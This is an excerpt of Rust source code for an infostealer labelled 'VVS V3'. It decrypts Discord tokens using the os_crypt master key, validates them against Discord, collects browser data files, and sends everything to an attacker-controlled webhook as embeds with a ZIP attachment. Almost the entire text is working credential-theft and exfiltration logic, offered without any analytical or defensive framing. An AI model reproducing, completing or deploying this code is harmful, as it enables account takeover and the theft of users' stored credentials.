...
fn build_token_embed(name: &str, token: &str, user: &DdU) -> Value {
    let avatar_url = user
        .avatar
        .as_ref()
        .map(|h| format!("https://cdn.discordapp.com/avatars/{}/{}.png", user.id, h))
...
fn build_browser_summary_embed(file_count: usize) -> Value {
    json!({
        "title": "Browser Data",
        "color": 0x5865F2,
        "description": format!("`{}` fichier(s) navigateur extraits (voir pièce jointe ZIP).", file_count),
        "footer": { "text": "VVS V3" },
        "timestamp": chrono::Utc::now().to_rfc3339()
    })
}
...
fn decrypt_token(raw_data: &[u8], master_key: &[u8]) -> Option<String> {
    ...
    let (iv, ciphertext) = match prefix {
        b"v10" | b"v11" | b"v20" => (&raw_data[3..15], &raw_data[15..]),
        _ => {
            if raw_data.len() < 12 {
                return None;
            }
...
async fn collect_discord_embeds(
    ...
    for (name, path) in discord_paths {
        ...
        let enc_key = match json_ls["os_crypt"]["encrypted_key"].as_str() {
            Some(k) => k,
            None => continue,
        };

        let bytes = match general_purpose::STANDARD.decode(enc_key) {
            Ok(b) => b,
            Err(_) => continue,
        };
        ...
        for entry in entries.flatten() {
            ...
            for cap in re.captures_iter(&text) {
                ...
                let enc_data = match general_purpose::STANDARD.decode(b64_part) {
                    Ok(d) => d,
                    Err(_) => continue,
                };

                let token = match decrypt_token(&enc_data, &master_key) {
                    Some(t) => t,
                    None => continue,
                };
                ...
                if let Some(user) = vt(client, &token).await {
                    embeds.push(build_token_embed(name, &token, &user));
                }
            }
        }
    }

    Ok((embeds, sent_tokens.len()))
}
...
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    ...
    log::log("browser + discord extraction (parallel)...");
    let browser_handle = std::thread::spawn(browsers::extract_all);

    let (mut embeds, token_count) = collect_discord_embeds(&client).await?;
    log::log(&format!("discord tokens collected: {token_count}"));

    let browser_files = browser_handle.join().unwrap_or_default();
    log::log(&format!("browser files collected: {}", browser_files.len()));

    if !browser_files.is_empty() {
        embeds.push(build_browser_summary_embed(browser_files.len()));
    }

    match browsers::sender::send_combined(&client, wbh, &embeds, &browser_files).await {
        Ok(()) => log::log("combined webhook send OK"),
        Err(e) => log::log(&format!("combined webhook send ERR: {e}")),
    }
